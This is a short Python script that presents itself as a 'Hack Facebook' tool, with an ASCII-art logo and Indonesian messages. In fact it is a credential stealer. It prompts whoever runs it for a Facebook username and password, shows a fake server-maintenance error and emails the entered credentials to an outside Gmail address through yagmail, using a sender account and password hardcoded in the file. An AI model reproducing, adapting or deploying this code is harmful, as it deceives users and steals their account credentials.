# -*- coding: utf-8 -*-
# coding=utf-8
import socket,struct,os,sys,time,yagmail
x=yagmail.SMTP('donkidslogger@gmail.com','zaq123+-')
subject='Yuhuuu Gopud'
logo = """\x1b[34m

 ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀  █████▒▄▄▄▄   
▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓██   ▒▓█████▄ 
▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒████ ░▒██▒ ▄██
░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░▓█▒  ░▒██░█▀  
░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒█░   ░▓█  ▀█▓
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒ ░   ░▒▓███▀▒
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░     ▒░▒   ░ 
 ░  ░░ ░  ░   ▒   ░        ░ ░░ ░  ░ ░    ░    ░ 
 ░  ░  ░      ░  ░░ ░      ░  ░           ░      
                  ░                            ░\x1b[00m"""

banner = """
\x1b[34mHack Facebook By D4RK_KN1GHT94
\x1b[00m100% Work
\x1b[00mLogin Dulu Bos! \x1b[91m!
"""
def main():
	os.system('clear')
	print(logo)
	print(banner)
	print('\x1b[00m\033[41m FACEBOOK LOGIN \033[00m')
	u=input('\x1b[00mUsername: \x1b[33m')
	p=input('\x1b[00mPassword: \x1b[33m')
	msg=('username: '+u+', password: '+p)
	body=(msg)
	os.system('sleep 8')
	print('')
	print('\x1b[00mSory Server Masih Dalam Perbaikan\x1b[91m !\x1b[00m')
	print('\x1b[33mCoba Lagi Nanti ...')
	os.system('sleep 3')
	print('')
	print('\x1b[00mExiting program \x1b[91m!')
	os.system('exit')
	x.send('tuyultamvan1@gmail.com',subject,body)

main()
